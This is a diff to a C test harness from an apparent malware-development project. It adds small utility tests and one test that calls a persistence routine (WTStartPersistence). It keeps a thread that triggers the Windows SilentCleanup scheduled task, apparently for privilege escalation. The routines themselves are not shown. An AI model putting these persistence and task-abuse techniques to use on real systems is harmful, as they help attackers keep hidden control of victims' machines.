@@ -30,7 +30,7 @@ VOID Callback
 VOID StartTaskThread()
 {
 	HANDLE hEvent = NULL;
-	
+
 	while (TRUE) {
 		hEvent = OpenEventW(EVENT_ALL_ACCESS, FALSE, L"EventSink");
 		if (hEvent != NULL) {
@@ -39,7 +39,7 @@ VOID StartTaskThread()
 
 		Sleep(2000);
 	}
-	
+
 	if (!StartTask(L"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup")) {
 		return;
 	}
@@ -331,6 +331,33 @@ void test15() {
 	FREE(pCipherText);
 }
 
+void test16() {
+	MessageBoxW(NULL, L"Hello World", L"Title", MB_OK);
+	return 0;
+}
+
+void test17() {
+	CHAR wszInput[] = "As before, a side effect of this design is that when a function returns the same value as one of its callees, it needs to read the return value from the callee from its own activation record, then place it back onto the stack at a return value in its caller’s activation record. Tail call optimizations (TCO) thus remain impossible.";
+	LPSTR lpOutput = NULL;
+
+	lpOutput = StrReplaceA(wszInput, "a", "bbbbbbbbb", TRUE, 0);
+	printf("%s\n", wszInput);
+	printf("-----------------------------\n");
+	printf("%s\n", lpOutput);
+	FREE(lpOutput);
+}
+
+void test18() {
+	LPSTR lpOutput = GenGUIDStrA();
+	printf("%s\n", lpOutput);
+	FREE(lpOutput);
+}
+
+void test19() {
+	WTStartPersistence("C:\\Users\\Admin\\source\\repos\\MalDev\\x64\\Debug\\Test.exe");
+	return;
+}
+
 int main() {
 	//StartTask(L"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup");
 	//test1();
@@ -345,6 +372,10 @@ int main() {
 	//test12();
 	//test13();
 	//test14();
-	test15();
+	//test15();
+	//test16();
+	//test17();
+	//test18();
+	test19();
 	return 0;
 }
